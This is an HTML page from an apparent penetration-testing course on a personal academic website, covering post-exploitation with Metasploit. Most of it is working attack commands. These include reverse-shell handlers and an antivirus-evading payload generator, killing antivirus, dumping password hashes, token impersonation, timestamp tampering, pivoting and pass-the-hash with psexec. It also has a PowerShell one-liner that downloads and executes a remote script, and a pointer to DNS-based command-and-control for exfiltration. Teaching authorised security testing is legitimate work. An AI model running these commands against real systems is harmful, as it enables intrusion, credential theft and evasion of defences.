<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="Vitaly Ford smart grid security research">
    <meta name="author" content="Vitaly Ford">
    <link rel="icon" href="../../../favicon.ico">

    <title>Vitaly Ford's Personal Website</title>

    <!-- Bootstrap core CSS -->
    <link href="../css/bootstrap.min.css" rel="stylesheet">

    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <link href="../css/ie10-viewport-bug-workaround.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="../css/navbar-fixed-top.css" rel="stylesheet">

    <script src="../js/ie-emulation-modes-warning.js"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
</head>

<body>

    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
        <div class="container">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar"
                    aria-expanded="false" aria-controls="navbar">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <p class="navbar-brand" href="#">Vitaly Ford</p>
            </div>
            <div id="navbar" class="navbar-collapse collapse">
                <ul class="nav navbar-nav">
                    <li><a href="../index.html">Home</a></li>
                    <li><a href="../research.html">Research</a></li>
                    <li><a href="../publications.html">Publications</a></li>
                    <li><a href="../docs/VitalyFordResume.pdf" target="_blank" rel="noopener norefferer">Resume</a></li>
                    <li><a href="../schedule.html">Schedule</a></li>
                    <li><a href="../contact.html">Contact</a></li>
                    <li class="dropdown">
                        <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true"
                            aria-expanded="false">My Talks<span class="caret"></span></a>
                        <ul class="dropdown-menu">
                            <li><a href="../docs/obscurity-in-cybersecurity.pdf" target="_blank" rel="noopener norefferer">Obscurity
                                    in Cybersecurity</a></li>
                            <li><a href="../docs/aws.pdf" target="_blank" rel="noopener norefferer">Cloud (AWS)
                                    Workshop</a></li>
                        </ul>
                    </li>
                    <li><a href="../et.html">Meet</a></li>
                    <li class="dropdown">
                        <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true"
                            aria-expanded="false">Pentest <span class="caret"></span></a>
                        <ul class="dropdown-menu">
                            <li><a href="00-Background.html">00 Background</a></li>
                            <li><a href="01-Social-Engineering.html">01 Social Engineering</a></li>
                            <li><a href="02-Assessment-Planning.html">02 Assessment Planning</a></li>
                            <li><a href="03-Passive-Intelligence-Gathering.html">03 Passive Intelligence Gathering</a></li>
                            <li><a href="04-Active-Intelligence-Gathering.html">04 Active Intelligence Gathering</a></li>
                            <li><a href="05-Exploitation.html">05 Exploitation</a></li>
                            <li class="active"><a href="06-Post-Exploitation.html">06 Post-Exploitation</a></li>
                        </ul>
                    </li>
                </ul>
            </div>
            <!--/.nav-collapse -->
        </div>
    </nav>

    <div class="container">

        <!-- Main component for a primary marketing message or call to action -->
        <div class="normal-text style-2901">
            <h2><code> &gt;&gt; Practical Security Assessment (Penetration Testing) - Post-Exploitation</code></h2>
            <h3 id="setting-up-a-listening-server-for-reverse-connections">Setting up a Listening Server for Reverse
                Connections</h3>
            <p>In Metasploit:</p>
            <pre><code class="language-sh">use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set ExitOnSession false
set LHOST ...
set LPORT ...
exploit -j</code></pre>
            <h3 id="creating-your-own-payloads">Creating Your Own Payloads</h3>
            <p>There are nice cheatsheets for msfvenom out there that help you create your own executables. When the user launches those executables, they will connect back to your machine -- providing a "reverse shell". For example, <a href="https://github.com/frizb/MSF-Venom-Cheatsheet">msfvenom cheatsheet</a>.</p>
            <p>But, there are many more sophisticated ways to generate your payload that bypasses AV. For example, Metasploit 5 contains <code class="language-sh">evasion</code> module as you can see <a href="https://github.com/rapid7/metasploit-framework/pull/10759">here</a>:</p>
            <pre><code class="language-sh">use evasion/windows/windows_defender_exe
set payload windows/meterpreter/reverse_https
set lhost our_real_IP
run
handler -p windows/meterpreter/reverse_https -H 0.0.0.0 -P 8443  # to start the listener</code></pre>
            <p>After creating the executable, you dump it to the user one way or the other and then make the user run it.</p>
            <h3 id="migration-to-another-service-for-a-stable-connection">Migration to Another Service for a Stable
                Connection</h3>
            <p>Type to migrate to the explorer.exe service: <code>run migrate -n explorer.exe</code></p>
            <h3 id="switch-to-windows-shell">Switch to Windows Shell</h3>
            <p>Type: <code>shell</code></p>
            <h3 id="enumerate-windows-users">Enumerate Windows Users</h3>
            <p>Type: <code>net user</code></p>
            <h3 id="see-which-users-are-admins">See Which Users are Admins</h3>
            <p>Type: <code>net localgroup Administrators</code></p>
            <h3 id="list-sessions">List Sessions</h3>
            <p>Type: <code>sessions -l</code></p>
            <h3 id="interact-with-a-particular-session">Interact with a particular session</h3>
            <p>Type: <code>sessions -i 1</code></p>
            <h3 id="when-you-get-a-shell-on-windows-box">When you get a shell on Windows box</h3>
            <pre><code class="language-sh">sysinfo  # take a look at the system&apos;s information
getuid  # check who we are currently
use priv  # load priv extensions for getsystem and some other options
getsystem  # try to escalate privileges to SYSTEM
run killav  # try to kill antivirus
run post/windows/gather/checkvm  # check if we are in a VM or not
run post/windows/gather/hashdump  # dump hashes of user passwords
run winenum  # generic report when you compromised the machine
run getcountermeasure  # what defensive
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_shares
run post/windows/gather/enum_snmp
reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  # check out what is running when the machine boots up</code></pre>
            <h3 id="impersonation-of-a-user">Impersonation of a User</h3>
            <p>Do <code>getsystem</code> before impersonating somebody:
                {Just for the record, mitigation: set account to not be delegated when created in the AD to avoid
                impersonation}</p>
            <pre><code class="language-sh">use incognito  # allows to interact with a token in the memory
list_tokens -u  # Microsoft stores a token in memory to log in users faster
list_rokens -g  # list groups
impersonate_token DOMAIN\\Administrator</code></pre>
            <h3 id="drop-back-to-a-regular-user">Drop back to a regular user</h3>
            <p><code>rev2self</code></p>
            <h3 id="gather-data-on-the-compromised-machine">Gather data on the compromised machine</h3>
            <p><a href="https://github.com/leostat/rtfm">rtfm.py</a> is a wonderful tool to remember all kinds of
                commands to gather data on the machine: users, network information, process list, system host info,
                file search, file shares, etc.</p>
            <h3 id="prove-access">Prove Access</h3>
            <pre><code class="language-sh">upload /home/Vitaly/Vitaly.txt c:\\
timestomp C:\\Vitaly.txt -v
timestomp C:\\Vitaly.txt -m &quot;07/07/1892 07:07:07&quot;
timestomp C:\\Vitaly.txt -v</code></pre>
            <h3 id="enumerate-the-network-inside-of-meterpreter-s-session">Enumerate the Network inside of
                Meterpreter&apos;s Session</h3>
            <pre><code class="language-sh">run netenum
run netenum -ps -r 10.10.30.0/24
run post/windows/gather/arp_scanner RHOSTS=10.10.30.0./24</code></pre>
            <h3 id="pivoting-via-metepreter-s-session">Pivoting via Metepreter&apos;s Session</h3>
            <ul>
                <li>Setting a route through the compromised host in Metasploit (outside of Meterpreter)</li>
                <li>Turning the compromised machine into a router
                    <pre><code class="language-sh">route print
route add COMPROMISED_IP 255.255.0.0 SESSION_ID</code></pre>
                    Now we can run a port scan through the compromised machine in Metasploit (outside of Meterpreter):
                    <pre><code class="language-sh">use auxiliary/scanner/portscan/tcp
set RHOSTS IP
set THREADS 10
run</code></pre>
                </li>
            </ul>
            <h3 id="pivoting-via-socks-proxy-in-metasploit">Pivoting via SOCKS proxy in Metasploit</h3>
            <a href="https://www.offensive-security.com/metasploit-unleashed/proxytunnels/">Read here</a> about
            the proxy tunnels through Metasploit. Also, check out <a href="https://pentest.blog/explore-hidden-networks-with-double-pivoting/">Exploring
                hidden networks with double pivoting</a>. You create a proxy server in Metasploit that listens
            for connections. Then you link proxychains with that proxy server. After that, you can run any
            command through proxychains in the terminal. Here are the steps:<ol>
                <li>Get a meterpreter shell through a vulnerable service or by any other means</li>
                <li>Now we need to route the traffic and there are two ways we will take a look at. The shorter
                    version is at the end of this list and here is the longer version: <code>use
                        post/windows/manage/autoroute</code> module in Metasploit (outside of meterpreter) to
                    create routing of the traffic through the session ID of the compromised machine</li>
                <li>In the autoroute module, set <code>SESSION</code> (if only one meterpreter session, then it
                    should be equal 1), <code>SUBNET</code> (that&apos;s the network that you cannot see but
                    the compromised system can see, e.g., 192.168.30.0), and <code>NETMASK</code> (e.g.,
                    255.255.0.0) to the appropriate values</li>
                <li><code>run</code> the module</li>
                <li>After the module completes, <code>use auxiliary/server/socks4a</code> module to create a
                    proxy server in Metasploit</li>
                <li>Set <code>SRVHOST</code> (Kali&apos;s IP address) and <code>SRVPORT</code> (9988 or
                    anything else you want)</li>
                <li><code>run</code> the module</li>
                <li>After the socks4a server started, open the terminal and edit <code>/etc/proxychains.conf</code>
                    by adding a line <code>socks4 127.0.0.1 9988</code> at the end of the file where <code>8080</code>
                    is the SRVPORT you set on step 6</li>
                <li>Now you can run any command in the terminal through the meterpreter session by adding <code>proxychains</code>
                    word in front of the command, e.g., <code>proxychains nmap -A 192.168.30.0/24</code></li>
            </ol>
            <p>There is an alternative way to <code>autoroute</code> if you have a meterpreter shell open. Type <code>run
                    autoroute -s 192.168.30.0/24</code> to route the traffic to <code>192.168.30.0/24</code> through
                the current meterpreter&apos;s session on the compromised machine. If you want to run traffic for a
                broader network, decrease the CIDR number like <code>run autoroute -s 192.168.0.0/16</code>.</p>
            <h3 id="psexec">psexec</h3>
            <p><a href="https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/">Pass The Hash</a> is
                a technique that, given a known hash of a known user, allows to pass those known credentials to another
                machine without even cracking the hash itself.</p>
            <pre><code class="language-sh">use exploit/windows/smb/psexecset SMBUSER Administrator
set SMBPASS jshkjfhaturtiuye3bj873thrdsyt34nsjfkgksh
set payload windows/x64/meterpreter/reverse_tcp
set RHOST ...
set LHOST ...
set LPORT ...
exploit</code></pre>
            <h3 id="port-forwarding-in-metasploit">Port Forwarding in Metasploit</h3>
            <p>Port forwarding allows you to instantly forward a port from your local machine to the compromised machine. In other words, if you want to use, for example, a remote desktop <code class="language-sh">rdesktop</code> command, you can forward the port 3389. First, enter in the meterpreter session, then you can just type portfwd command, after which you can remotely connect to the compromised machine by running <code class="language-sh">rdesktop 127.0.0.1:3389</code>. Another example that tries to use psexec exploit via shares on Windows box is shown below.</p>
            <pre><code class="language-sh">portfwd add -l 445 -p 445 -r remote_host_ip
background
use exploit/windows/smb/psexec
setg SMBUser known_user
setg SMBPASS known_password
set RHOST 127.0.0.1  # the exploit has to fire back to us though, so it goes to the localhost
set LHOST our_real_IP  # this is not 127.0.0.1, but rather the external IP
set LPORT 5555  # that is the port our exploit will be listening on
run</code></pre>
            <h3 id="escalate-privileges-on-windows">Escalate Privileges on Windows</h3>
            <p>There is a very popular technique to escalate privileges that target misconfigured services running as a
                privileged local account (like Java updater). So, you can use a tool like <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp</a>
                that not only targets and exploits those misconfigured services but also tries many other techniques to
                escalate privileges. To run it on the compromised machine, you can use the following PowerShell command
                to download PowerUp.ps1 from <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp</a>
                and then run Invoke-AllChecks to identify possible ways of escalating privileges:</p>
            <pre><code class="language-powershell">powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&apos;https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc/PowerUp.ps1&apos;); Invoke-AllChecks</code></pre>
            <p>Additionally, privelege escalation modules are available in Metasploit as you can see <a href="https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/">here</a>.</p>
            <h3 id="escalate-privileges-on-linux">Escalate Privileges on Linux</h3>
            <p>Similarly to Windows, there are techniques that allow you to escalate privileges on Linux. Most
                commonly, you are going to look for files that are world-writable, SUID/GUID files owned by root, and
                misconfigurations. Some tools to do that:</p>
            <ul>
                <li><a href="https://github.com/pentestmonkey/unix-privesc-check">Unix-privesc-check</a> and learn how
                    to use it from <a href="http://pentestmonkey.net/tools/audit/unix-privesc-check">pentestmonkey</a></li>
                <li><a href="https://github.com/rebootuser/LinEnum">LinEnum</a></li>
                <li><a href="https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack">List of Linux/Unix known
                        privilege escalation exploits</a> which has not been updated since 2014 but is still worth
                    looking at</li>
            </ul>
            <h3 id="ssh-tunnel">SSH Tunnel</h3>
            <pre><code class="language-sh">ssh -L 3389:localhost:3389 username@compromised_host_IP</code></pre>
            Open a new terminal window and type: <code>rdesktop 127.0.0.1</code>
            <hr>
            <h3 id="discover-the-hosts-inside-of-metasploit-using-db_nmap">Discover the Hosts inside of Metasploit
                using db_nmap</h3>
            <pre><code class="language-sh">db_nmap -sn -n -v --exclude our_IP remote_IP_range
-F # top 100 ports
-sS # SYN scan
-sC # run default nse scripts according to -sV
-oX # output with XML format
--reason
--open # show results if ports are open
db_nmap -p- -sS -n -v  --reason --open -oX demo-ports.xml --stylesheet=nmap.xml IP # -p- all the ports from 0 to 65535

db_nmap -sU -n -v --open --reason IP

db_import demo-ports.xml</code></pre>
            <h3 id="service-version-scan-inside-of-metasploit-using-db_nmap">Service Version Scan inside of Metasploit
                using db_nmap</h3>
            <pre><code class="language-sh">db_nmap -sS -sV -sC -v -n -p 21,22,80,1617,4848,5985,8022,8080,8282,8484,8585,9200,49153 IP</code></pre>
            <h3 id="command-and-control-c2-channel-over-dns-protocol">Command and Control (C2) channel over DNS
                protocol</h3>
            <p><a href="https://github.com/iagox86/dnscat2">dnscat2</a> is a tool that is designed to create an
                encrypted C2 over DNS, which can be used as one of the most effective tunnels to send and receive data
                from compromised networks. This is a perfect way to evade firewalls, IDS/IPS, and exfiltrate data over
                DNS which is typically on. You may need to pay some money for an authoritative DNS server on Namecheap
                or GoDaddy.</p>
            <h3 id="post-exploitation-command-lists-from-rob-fuller-mubix-">Post-Exploitation Command Lists from Rob
                Fuller (Mubix)</h3>
            <ul>
                <li><a href="https://docs.google.com/document/d/1ZrDJMQkrp_YbU_9Ni9wMNF2m3nIPEA_kekqqqA2Ywto/edit">Metasploit
                        Post-Exploitation</a></li>
                <li><a href="https://docs.google.com/document/d/1ObQB6hmVvRPCgPTRZM5NMH034VDM-1N-EWPRz2770K4/edit?hl=en_US">Linux/Unix/BSD
                        Post-Exploitation</a></li>
                <li><a href="https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit?hl=en_US">Windows
                        Post-Exploitation</a></li>
                <li><a href="https://docs.google.com/document/d/10AUm_zUdAQGgoHNo_eS0SO1K-24VVYnulUD2x3rJD3k/edit?hl=en_US#">OSX
                        Post-Exploitation</a></li>
                <li><a href="https://docs.google.com/document/d/1CIs6O1kMR-bXAT80U6Jficsqm0yR5dKUfUQgwiIKzgc/edit">Obscure
                        Systems (AIX, Embedded, etc.) Post-Exploitation</a></li>
            </ul>
        </div>

    </div> <!-- /container -->


    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script>
        window.jQuery || document.write('<script src="../js/jquery.min.js"><\/script>')
    </script>
    <script src="../js/bootstrap.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="../js/ie10-viewport-bug-workaround.js"></script>
</body>

</html>